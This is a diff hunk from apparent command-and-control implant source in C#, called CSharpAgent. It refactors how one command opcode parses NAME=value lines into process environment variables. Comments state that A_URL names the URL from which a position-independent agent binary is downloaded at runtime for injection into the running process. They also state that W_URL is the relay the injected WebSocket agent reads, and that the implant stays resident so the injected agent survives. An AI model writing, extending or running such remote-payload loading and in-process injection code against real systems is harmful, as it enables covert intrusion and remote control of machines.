@@ -71,24 +71,26 @@ namespace CSharpAgent
             }
             if (command[0] == 12)
             {
-                // Payload (ASCII text after the opcode): one NAME=value line per process env
-                // var to set (the same env-line style the 0x0B headers use, minus the !d/!e
-                // control lines and the blob body — no blank-line split, text runs to the end
-                // of the frame). A_URL picks which PIC agent binary C2Payload downloads;
+                // Payload after the opcode: ASCII `NAME=value` env lines (the same env-line
+                // style the 0x0B headers use). A_URL names the URL we download the PIC agent
+                // bytes from at runtime (C2Payload.Data — the bytes never ride the command);
                 // W_URL is the relay the injected WebSocket agent reads from the process env.
                 // We stay resident afterwards: the injected agent runs in THIS process, so
                 // exiting would kill it too.
                 try
                 {
-                    var lines = Encoding.ASCII.GetString(command, 1, command.Length - 1).Split('\n');
-                    for (var i = 0; i < lines.Length; i++)
+                    var start = 1;
+                    while (start < command.Length)
                     {
-                        var line = lines[i].TrimEnd('\r');
-                        if (line.Length == 0) continue;
+                        var nl = Array.IndexOf(command, (byte)'\n', start);
+                        var end = nl < 0 ? command.Length : nl;
+                        var line = Encoding.ASCII.GetString(command, start, end - start).TrimEnd('\r');
                         var eq = line.IndexOf('=');
-                        if (eq <= 0) continue;
-                        Environment.SetEnvironmentVariable(line.Substring(0, eq), line.Substring(eq + 1),
-                            EnvironmentVariableTarget.Process);
+                        if (eq > 0)
+                            Environment.SetEnvironmentVariable(line.Substring(0, eq), line.Substring(eq + 1),
+                                EnvironmentVariableTarget.Process);
+                        if (nl < 0) break;
+                        start = nl + 1;
                     }
                     var payload = C2Payload.Data;
                     if (payload.Length == 0) return U32Bytes(1); // no A_URL ⇒ nothing to inject
